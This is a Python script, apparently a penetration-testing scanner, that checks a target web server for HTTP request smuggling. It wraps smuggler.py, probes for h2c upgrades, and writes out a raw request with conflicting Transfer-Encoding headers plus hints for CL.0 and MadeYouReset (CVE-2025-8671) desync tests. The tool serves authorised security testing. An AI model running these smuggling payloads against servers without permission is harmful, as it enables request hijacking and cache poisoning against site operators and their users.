#!/usr/bin/env python3
"""
HTTP/1.1 + HTTP/2 Request Smuggling detector.

Wrapper around smuggler.py (PortSwigger) plus HTTP/2 specific tests:
- TE.CL / CL.TE / CL.CL classic smuggling
- H2.CL / H2.TE — HTTP/2 → HTTP/1.1 desync
- MadeYouReset (CVE-2025-8671)
- Browser-powered desync

Usage:
    python3 http_smuggling.py --target https://example.com --output ./out
"""

import argparse
import json
import shutil
import subprocess
from pathlib import Path

import requests


def run_smuggler(target: str, out_dir: Path) -> dict:
    if not shutil.which("smuggler") and not Path("/opt/smuggler/smuggler.py").exists():
        return {"error": "smuggler.py not installed"}
    cmd = "smuggler" if shutil.which("smuggler") else "python3 /opt/smuggler/smuggler.py"
    try:
        r = subprocess.run(
            cmd.split() + ["-u", target, "-q"],
            capture_output=True, text=True, timeout=180,
        )
        log = out_dir / "smuggler.txt"
        log.write_text(r.stdout + "\n" + r.stderr)
        confirmed = "CONFIRMED" in r.stdout
        return {"smuggler_ran": True, "confirmed": confirmed, "log": str(log)}
    except subprocess.TimeoutExpired:
        return {"smuggler_ran": False, "error": "timeout"}
    except Exception as e:
        return {"smuggler_ran": False, "error": str(e)}


def test_h2c_upgrade(target: str) -> dict:
    findings = []
    headers_test = {
        "Upgrade": "h2c",
        "HTTP2-Settings": "AAMAAABkAARAAAAAAAIAAAAA",
        "Connection": "Upgrade, HTTP2-Settings",
    }
    try:
        r = requests.get(target, headers=headers_test, timeout=10)
        if r.status_code == 101:
            findings.append({
                "test": "h2c_upgrade",
                "severity": "high",
                "evidence": "Server accepted h2c upgrade (status 101)",
            })
        if "Upgrade" in r.headers and "h2c" in r.headers.get("Upgrade", ""):
            findings.append({
                "test": "h2c_upgrade_advertised",
                "severity": "medium",
                "evidence": "Server advertises h2c upgrade in response",
            })
    except Exception as e:
        findings.append({"test": "h2c_upgrade", "error": str(e)})
    return {"h2c_findings": findings}


def manual_payloads(target: str) -> dict:
    host = target.replace("https://", "").replace("http://", "").split("/")[0]
    payloads = []
    payloads.append({
        "test": "TE_dual_header_TE_x",
        "raw_request": (
            "POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Transfer-Encoding: x\r\n"
            "Content-Length: 4\r\n"
            "\r\n"
            "0\r\n\r\n"
        ),
        "test_with": "Burp Repeater (raw mode) or curl --raw",
    })
    payloads.append({
        "test": "CL.0 desync (HTTP/2 → HTTP/1.1)",
        "instructions": "Via HTTP/2: POST with Content-Length: 0 + body. "
                        "If origin treats body as a separate request → CL.0 vuln",
        "tool": "Burp Pro Repeater HTTP/2 mode",
    })
    payloads.append({
        "test": "MadeYouReset (CVE-2025-8671)",
        "instructions": "HTTP/2 RST_STREAM on an in-flight request. "
                        "Vulnerable server hangs / leaks state",
    })
    return {"manual_payloads": payloads}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True)
    ap.add_argument("--output", required=True)
    args = ap.parse_args()

    out = Path(args.output)
    out.mkdir(parents=True, exist_ok=True)

    print(f"[*] HTTP smuggling tests on {args.target}")
    results = {"target": args.target}

    print("[*] Running smuggler.py...")
    results.update(run_smuggler(args.target, out))

    print("[*] Testing h2c upgrade...")
    results.update(test_h2c_upgrade(args.target))

    print("[*] Generating manual payloads...")
    results.update(manual_payloads(args.target))

    out_file = out / "http_smuggling.json"
    out_file.write_text(json.dumps(results, indent=2, ensure_ascii=False))
    print(f"[+] Saved: {out_file}")


if __name__ == "__main__":
    main()
